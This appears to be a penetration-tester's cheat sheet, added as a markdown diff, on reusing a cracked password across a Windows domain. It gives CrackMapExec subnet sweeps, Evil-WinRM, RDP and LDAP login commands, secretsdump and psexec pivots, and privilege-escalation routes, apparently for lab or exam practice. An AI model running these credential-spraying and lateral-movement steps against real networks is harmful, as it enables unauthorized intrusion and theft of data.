@@ -1,0 +1,143 @@
+🔥 Example Move Flow:
+
+You crack: `hporter:h0rseB@tt`
+
+→ Immediately run:
+
+`crackmapexec smb 172.16.5.0/24 -u hporter -p 'h0rseB@tt' --local-auth`
+
+✅ CME tells you:
+
+- ✅ 172.16.5.15 = Valid User Access
+    
+- ✅ 172.16.5.22 = Pwn3d! (Local Admin)
+    
+- ❌ 172.16.5.34 = Access Denied
+    
+
+---
+
+🔹 **If Valid User:**  
+– Try SMB share hunting  
+– Try proxychains Evil-WinRM if WinRM open  
+– Try RDP (if 3389 open, needs `ssh -L` if internal)
+** IF DOMAIN JOINED USER SHIP SHARPHOUND AND RUN ASAP!** 
+
+🔹 **If Local Admin:**  
+– Immediately plan pivot:  
+- secretsdump  
+- psexec.py  
+- wmiexec.py  
+- SharpHound collection with `-c All`
+
+🔹 **If Access Denied:**  
+– Still log the IP. Might be useful if you find another credential later.
+
+## 🎯 Initial Immediate Actions
+
+### 1. **Validate the Creds**
+
+|Tool|Command|
+|---|---|
+|CrackMapExec|`crackmapexec smb <ip> -u USER -p PASS`|
+|Evil-WinRM|`evil-winrm -i <ip> -u USER -p PASS`|
+|RDP Test|`xfreerdp3 /u:USER /p:"PASS" /v:<ip> /cert:ignore`|
+|SMBClient|`smbclient //IP/SHARE -U "USER%PASS"`|
+|LDAP/AD bind|`windapsearch -u USER@domain.local -p PASS`|
+
+✅ **Goal:** Confirm login works against at least one service.
+
+---
+
+## 📚 Reuse the Credentials Across Services
+
+### 2. **Services to Reuse Creds On**
+
+|Service|Tool / Test|Reason|
+|---|---|---|
+|**SMB**|`cme smb <ip> -u USER -p PASS --shares`|Share hunting, lateral movement|
+|**RDP**|`xfreerdp3`|GUI access, pivot points|
+|**WinRM**|`evil-winrm`|Shell access|
+|**MSSQL**|`mssqlclient.py` or `sqsh`|xp_cmdshell exploitation|
+|**LDAP**|`ldapsearch` or `windapsearch`|Enumeration, pulling domain structure|
+|**FTP**|`ftp IP` → `USER` + `PASS`|Misconfig file access|
+|**HTTP Web Panels**|Browser login or Burp|Admin panels, dashboards|
+|**VPN / Internal Apps**|Browser login|Lateral movement through internal apps|
+|**WMI**|`wmiexec.py`|Stealthy shell without SYSTEM needed|
+
+---
+
+## 🛠️ Credential Usage Flows
+
+### 3. **Credentialed Enumeration Once Validated**
+
+|Service|Tool|Command / Actions|
+|---|---|---|
+|SMB Shares|CrackMapExec|`cme smb <ip> -u USER -p PASS --shares`|
+|Local Admin Check|CrackMapExec|`cme smb <ip> -u USER -p PASS --local-auth`|
+|Logged-On Users|CrackMapExec|`cme smb <ip> -u USER -p PASS --loggedon-users`|
+|Sessions / Local Admins|BloodHound|Session collection, local admin collection with creds|
+|LDAP Enumeration|windapsearch|`windapsearch -u USER@domain -p PASS --da`, `--pu`, `--all`|
+|SMB Spidering|CrackMapExec|`cme smb <ip> -u USER -p PASS -M spider_plus --share <share>`|
+|Secrets Dump|secretsdump.py|Only if SYSTEM access obtained later|
+
+✅ **Goal:** Blow up recon + find sensitive files, lateral users, privileged targets.
+
+---
+
+## 🧩 Where to Prioritize Reuse
+
+|Target Type|Reuse?|Reason|
+|---|---|---|
+|Same subnet hosts|✅|Often same local user password across internal machines|
+|Domain controllers|✅|Test if domain user has weak perms or sessions|
+|SQL servers|✅|Database pivot via SQLSvc style users|
+|Web apps with auth|✅|Engineers reuse AD creds on web apps constantly|
+|FTP/SMB shares|✅|Lazy setups with same accounts reused for file transfer|
+|RDP-only hosts|✅|Manual lateral movement entry points|
+
+---
+
+## 🔥 Special Situations to Catch
+
+- **Backup Operators** → escalate to SYSTEM via shadowcopy
+    
+- **Account Operators** → create user in domain (user add abuse)
+    
+- **Service Accounts** (svc*, sqlsvc, mssqladm) → usually have higher privs, often can be escalated via SPN, Unconstrained Delegation
+    
+- **VPN Portals** or **internal Admin Panels** → Same username:password reuse
+    
+
+---
+
+## 📋 Final 30-Second Mental Checklist When You Get Creds
+
+✅ 1. Validate them immediately (CME, WinRM, SMB, RDP)
+
+✅ 2. Reuse on **every internal live host** — SMB, RDP, SQL, LDAP
+
+✅ 3. If login succeeds → **Pillage the box** (shares, sessions, local admins)
+
+✅ 4. Re-run BloodHound if new permissions unlocked
+
+✅ 5. Document:
+
+- Where they worked
+    
+- Where they failed
+    
+- What new doors opened
+    
+
+✅ 6. Always ask:
+
+> "_Can this cred laterally move?  
+> Can this cred escalate?  
+> Can this cred pivot into a flag?_"
+
+---
+
+# ⚡ TL;DR Flow
+
+**Found creds → Validate → Enumerate → Pillage → Reuse everywhere → Map new paths → Dominate.**
